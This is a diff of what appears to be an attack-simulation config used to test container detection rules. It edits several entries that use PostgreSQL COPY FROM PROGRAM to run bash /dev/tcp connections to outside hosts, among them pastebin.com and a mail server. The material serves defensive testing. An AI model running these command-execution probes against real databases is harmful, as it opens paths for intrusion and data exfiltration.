@@ -538,9 +538,9 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/1.1.1.1/53\" && echo ep_cloudflare_dns_ok || echo ep_cloudflare_dns_failed'; SELECT * FROM cmd_out;"]
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/1.1.1.1/53\" >/dev/null 2>&1; echo ep_cloudflare_dns_attempted'; SELECT * FROM cmd_out;"]
     successIndicators:
-      - bodyContains: "ep_cloudflare_dns_ok"
+      - bodyContains: "ep_cloudflare_dns_attempted"
     expectedDetections:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
@@ -551,9 +551,9 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/8.8.8.8/53\" && echo ep_google_dns_ok || echo ep_google_dns_failed'; SELECT * FROM cmd_out;"]
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/8.8.8.8/53\" >/dev/null 2>&1; echo ep_google_dns_attempted'; SELECT * FROM cmd_out;"]
     successIndicators:
-      - bodyContains: "ep_google_dns_ok"
+      - bodyContains: "ep_google_dns_attempted"
     expectedDetections:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
@@ -577,9 +577,9 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/1.1.1.1/443\" && echo ep_public_https_ok || echo ep_public_https_failed'; SELECT * FROM cmd_out;"]
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/1.1.1.1/443\" >/dev/null 2>&1; echo ep_public_https_attempted'; SELECT * FROM cmd_out;"]
     successIndicators:
-      - bodyContains: "ep_public_https_ok"
+      - bodyContains: "ep_public_https_attempted"
     expectedDetections:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
@@ -606,9 +606,9 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/pastebin.com/443\" && echo ep_pastebin_ok || echo ep_pastebin_failed'; SELECT * FROM cmd_out;"]
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/pastebin.com/443\" >/dev/null 2>&1; echo ep_pastebin_attempted'; SELECT * FROM cmd_out;"]
     successIndicators:
-      - bodyContains: "ep_pastebin_ok"
+      - bodyContains: "ep_pastebin_attempted"
     expectedDetections:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
@@ -632,9 +632,9 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/example.com/80\" && echo ep_public_http_ok || echo ep_public_http_failed'; SELECT * FROM cmd_out;"]
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/example.com/80\" >/dev/null 2>&1; echo ep_public_http_attempted'; SELECT * FROM cmd_out;"]
     successIndicators:
-      - bodyContains: "ep_public_http_ok"
+      - bodyContains: "ep_public_http_attempted"
     expectedDetections:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
@@ -645,9 +645,9 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/aspmx.l.google.com/25\" && echo ep_smtp_ok || echo ep_smtp_failed'; SELECT * FROM cmd_out;"]
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/aspmx.l.google.com/25\" >/dev/null 2>&1; echo ep_smtp_attempted'; SELECT * FROM cmd_out;"]
     successIndicators:
-      - bodyContains: "ep_smtp_ok"
+      - bodyContains: "ep_smtp_attempted"
     expectedDetections:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
